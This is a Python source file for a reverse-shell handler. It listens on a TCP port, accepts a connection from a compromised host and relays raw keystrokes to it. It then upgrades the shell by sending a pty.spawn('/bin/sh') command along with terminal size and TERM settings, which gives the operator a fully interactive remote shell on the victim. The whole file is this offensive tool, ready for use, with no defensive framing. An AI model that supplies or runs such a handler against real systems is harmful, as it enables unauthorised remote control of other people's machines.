import socket
import tty
import termios
from os import popen
import sys
from threading import Thread
from time import sleep


class _GetchUnix:
    def __call__(self):
        global FD, OLD_SETTINGS
        FD = sys.stdin.fileno()
        OLD_SETTINGS = termios.tcgetattr(FD)
        try:
            tty.setraw(sys.stdin.fileno())
            ch = sys.stdin.read(1)
        finally:
            termios.tcsetattr(FD, termios.TCSADRAIN, OLD_SETTINGS)
        return ch


getch = _GetchUnix()
FD = None
OLD_SETTINGS = None
CONN = None
CONN_ONLINE = 1
CLOSED = 0
TERM = ""
STDOUT = sys.stdout.buffer


def init():
    global FD, OLD_SETTINGS, CONN_ONLINE, CLOSED, CONN
    FD = None
    OLD_SETTINGS = None
    CONN = None
    CONN_ONLINE = 1
    CLOSED = 0


def stdprint(message):
    sys.stdout.write(message)
    sys.stdout.flush()


def close_socket():
    global FD, OLD_SETTINGS, CONN_ONLINE, CLOSED, CONN, TERM
    if (CLOSED):
        return
    CLOSED = 1
    CONN_ONLINE = 0
    try:
        CONN.close()
        termios.tcsetattr(FD, termios.TCSADRAIN, OLD_SETTINGS)
        termios.get
    except Exception:
        pass


def recv_daemon(conn):
    global CONN_ONLINE
    while CONN_ONLINE:
        try:
            tmp = conn.recv(16)
            if (tmp):
                STDOUT.write(tmp)
                sys.stdout.flush()
            else:
                raise socket.error
        except socket.error:
            stdprint("Connection close by socket.\n")
            conn.close()
            CONN_ONLINE = 0
            close_socket()


def input_deamon(talk):
    global CONN_ONLINE
    while CONN_ONLINE:
        c = getch()
        if not c:
            continue
        try:
            talk.send(bytes(c, encoding='utf-8'))
        except socket.error:
            break


def main(port, mode: int):
    global CONN, TERM
    init()
    CONN = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    CONN.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    CONN.settimeout(30.0)
    set_size = True
    try:
        CONN.bind(('0.0.0.0', port))
        CONN.listen(1)
    except socket.error:
        return False
    try:
        rows, columns = popen('stty size', 'r').read().strip().split(" ")
        term = popen('printf $TERM').read()
        TERM = term
    except Exception:
        term = "bomb"
        set_size = False
    try:
        talk, addr = CONN.accept()
        stdprint("Connect from %s.\n" % addr[0])
        t = Thread(target=recv_daemon, args=(talk, ))
        t.start()
        t = Thread(target=input_deamon, args=(talk, ))
        t.start()
        if (mode == 1):
            talk.send(bytes(
                """python -c "__import__('pty').spawn('/bin/sh')" && exit\n""", encoding='utf-8'))
        talk.send(bytes("""alias ls='ls --color=auto'\n""", encoding='utf-8'))
        talk.send(bytes("""alias grep='grep --color=auto'\n""", encoding='utf-8'))
        if (set_size):
            talk.send(bytes("""stty rows %s columns %s\n""" %
                            (rows, columns), encoding='utf-8'))
        talk.send(bytes("""export TERM=%s\n""" % term, encoding='utf-8'))
        talk.send(bytes("""reset %s\n""" % term, encoding='utf-8'))
        while CONN_ONLINE:
            sleep(0.5)
    except KeyboardInterrupt:
        pass
    except socket.timeout:
        stdprint("Connection timeout...\n")
    finally:
        stdprint("Connection close...\n")
        close_socket()
        return True


if (__name__ == "__main__"):
    main(int(sys.argv[1]), int(sys.argv[2]))
